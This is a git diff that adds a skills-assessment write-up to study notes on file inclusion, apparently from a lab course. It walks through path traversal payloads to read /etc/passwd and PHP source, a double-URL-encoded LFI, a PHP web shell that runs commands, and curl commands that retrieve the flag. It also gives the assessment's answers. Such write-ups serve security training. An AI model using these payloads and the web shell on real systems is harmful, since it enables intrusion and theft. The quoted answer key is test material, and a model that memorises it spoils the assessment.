@@ -11,6 +11,10 @@
     2. [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
     3. [LFI and File Uploads](#lfi-and-file-uploads)
     4. [Log Poisoning](#log-poisoning)
+3. [Automation and Prevention](#automation-and-prevention)
+    1. [Automated Scanning](#automated-scanning)
+    2. [File Inclusion Prevention](#file-inclusion-prevention)
+4. [Skills Assessment - File Inclusion](#skills-assessment-file-inclusion)
 
 ## Tools
 1. ffuf
@@ -241,3 +245,68 @@
     ![alt text](<Assets/File Inclusion Prevention - 1.png>)
 
     The answer is **security**.
+
+## Skills Assessment - File Inclusion
+1. Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
+
+    First, we need to explore the website. I found an interesting endpoint at **/apply.php**. In there, we can upload an file. So i suspected we can gain remote code execution by uploading a file. I uploaded "uploads.docx" that contain "tes". Since we dont know where the file is stored, we can try to fuzz to locate the file.
+
+    ```bash
+    ffuf -w /opt/useful/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://83.136.255.53:58119/FUZZ/upload.docx -fs 3405
+    ```
+    ![alt text](<Assets/Skills Assessment - 1.png>)
+
+    But unfortunatly, we cant reach both of them due to authorization error. When i tried to inspect the page, i found something.
+
+    ![alt text](<Assets/Skills Assessment - 2.png>)
+
+    The file is called from **/api/image.php?p=<filename>**. Not only that, we can see that **/api/application.php** endpoint is handling file upload. Based on that, i tried to find a way to read the source code of both of them. I found this vuln after doing some research:
+
+    ```bash
+    curl 'http://83.136.255.53:58119/api/image.php?p=....//....//....//....//....//....//....//....//....//etc/passwd'
+    ```
+
+    ![alt text](<Assets/Skills Assessment - 3.png>)
+    
+    We can use that vuln to read the source code of **/api/image.php**, **/api/application.php** and **/contact.php**.
+
+    ```bash
+    curl 'http://83.136.255.53:58119/api/image.php?p=....//api/application.php'
+    curl 'http://83.136.255.53:58119/api/image.php?p=....//api/image.php'
+    curl 'http://83.136.255.53:58119/api/image.php?p=....//contact.php'
+    ```
+    ![alt text](<Assets/Skills Assessment - 4.png>)
+
+    We can get these information from the source code. 
+    1. **/api/image.php** 
+        The api/image.php file uses file_get_contents(), not include(). file_get_contents reads text. It does not execute PHP.
+    2. **/api/application.php** 
+        The code does not check if the extension is .pdf or .docx. It accepts anything. It renames uploaded file to the MD5 hash of its content.
+    3. **/contact.php** 
+        In here, region paramater has LFI vuln. The script checks for dangerous characters (. and /) before it fully processes the input. After the check passes, the script manually runs urldecode(). This converts URL-encoded characters (like %2e) back into their real characters (like .). But, if we Double URL Encode (%252e%252e%252f), it will pass the check.
+        
+
+    Now, we can prepare the payload. We can use this payload: 
+
+    ```bash
+    echo '<?php system($_GET["cmd"]); ?>' > shell.php
+    ```
+    Once we have uploaded the payload, we can try to access it by calculating the md5 hash of the file.
+
+    ```bash
+    md5sum shell.php
+    ```
+    We got this md5sum, fc023fcacb27a7ad72d605c4e300b389. Now, we can try to test it.
+
+    ```bash
+    curl "http://94.237.53.219:31125/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=id"
+    ```
+    ![alt text](<Assets/Skills Assessment - 5.png>)
+    
+    It success get the id. Now, we can try to read the flag.
+
+    ```bash
+    curl "http://94.237.53.219:31125/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=ls%20%2F"
+    curl "http://94.237.53.219:31125/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=cat%20%2Fflag_09ebca.txt"
+    ```
+    The answer is **eedbb78d4800aa45573840ed6bd2d1e3**.
